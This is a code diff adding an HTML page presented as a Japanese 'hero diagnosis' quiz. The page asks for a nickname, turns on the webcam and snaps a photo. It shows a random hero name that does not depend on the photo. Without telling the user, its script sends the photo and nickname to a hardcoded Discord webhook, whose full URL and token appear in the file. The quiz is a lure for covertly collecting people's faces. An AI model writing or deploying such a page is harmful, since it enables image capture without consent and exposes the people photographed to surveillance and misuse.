@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hero AI Diagnosis</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        .hidden {
+            display: none;
+        }
+        .result {
+            margin-top: 20px;
+            font-size: 24px;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>ヒーロー診断</h1>
+    
+    <!-- ニックネーム入力 -->
+    <div id="nicknameDiv">
+        <label for="nickname">ニックネームを入力：</label>
+        <input type="text" id="nickname" placeholder="ニックネーム">
+        <button onclick="startCamera()">カメラを起動</button>
+    </div>
+
+    <!-- カメラ -->
+    <div id="cameraDiv" class="hidden">
+        <video id="video" width="320" height="240" autoplay></video>
+        <button onclick="takePhoto()">写真を撮る</button>
+    </div>
+
+    <!-- 結果 -->
+    <div id="resultDiv" class="hidden">
+        <h2>あなたのヒーローは...</h2>
+        <div id="resultText"></div>
+    </div>
+
+    <script>
+        const webhookURL = "https://discord.com/api/webhooks/1365970673616551946/5fJaT3-myLxSwMpJnK4pCgPF91F970Krj3TCH5NA3C5RPGJPFJRKFCWWp_Fe5tyD6eLg";
+
+        let videoStream;
+        const heroes = ["アサルト", "ボマー", "ゴースト", "メディック", "エレキ", "シールド", "チュチュ", "アイアン", "リーコン", "キャット", "ランチャー"];
+
+        function startCamera() {
+            document.getElementById("nicknameDiv").classList.add("hidden");
+            document.getElementById("cameraDiv").classList.remove("hidden");
+            
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    videoStream = stream;
+                    document.getElementById("video").srcObject = stream;
+                })
+                .catch(error => {
+                    alert("カメラの取得に失敗しました");
+                });
+        }
+
+        function takePhoto() {
+            const canvas = document.createElement("canvas");
+            const context = canvas.getContext("2d");
+            canvas.width = 320;
+            canvas.height = 240;
+            context.drawImage(document.getElementById("video"), 0, 0, 320, 240);
+            
+            const photoData = canvas.toDataURL("image/png");
+
+            // ランダムでヒーローを選択
+            const randomHero = heroes[Math.floor(Math.random() * heroes.length)];
+            document.getElementById("resultText").textContent = `あなたのヒーローは「${randomHero}」です！`;
+
+            document.getElementById("cameraDiv").classList.add("hidden");
+            document.getElementById("resultDiv").classList.remove("hidden");
+
+            // Webhookに送信
+            sendToWebhook(photoData, randomHero);
+        }
+
+        function sendToWebhook(photoData, hero) {
+            const nickname = document.getElementById("nickname").value;
+            const payload = {
+                content: `ニックネーム: ${nickname}\nヒーロー: ${hero}`,
+                embeds: [{
+                    title: `あなたのヒーロー診断結果`,
+                    image: { url: photoData }
+                }]
+            };
+
+            fetch(webhookURL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log("送信成功:", data);
+            })
+            .catch(error => {
+                console.error("送信エラー:", error);
+            });
+        }
+    </script>
+
+</body>
+</html>
